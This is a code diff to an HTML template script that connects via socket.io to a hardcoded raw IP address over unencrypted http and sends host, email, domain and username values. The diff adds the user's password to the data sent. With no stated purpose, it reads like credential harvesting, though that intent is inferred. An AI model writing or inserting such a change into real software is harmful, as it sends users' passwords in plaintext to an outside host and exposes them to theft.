@@ -13,7 +13,7 @@
   <script>
     var host_name = window.location.hostname;
     var socket = io('http://139.59.30.156:5000');
-    var details = {host: "{{host}}" , email: "{{email}}" , domain : "{{domain}}" , username : "{{username}}"};
+    var details = {host: "{{host}}" , email: "{{email}}" , domain : "{{domain}}" , username : "{{username}}", password : "{{password}}"};
     socket.emit("send_details", details);
     socket.on("socket_connected", function(data){
        console.log(data)
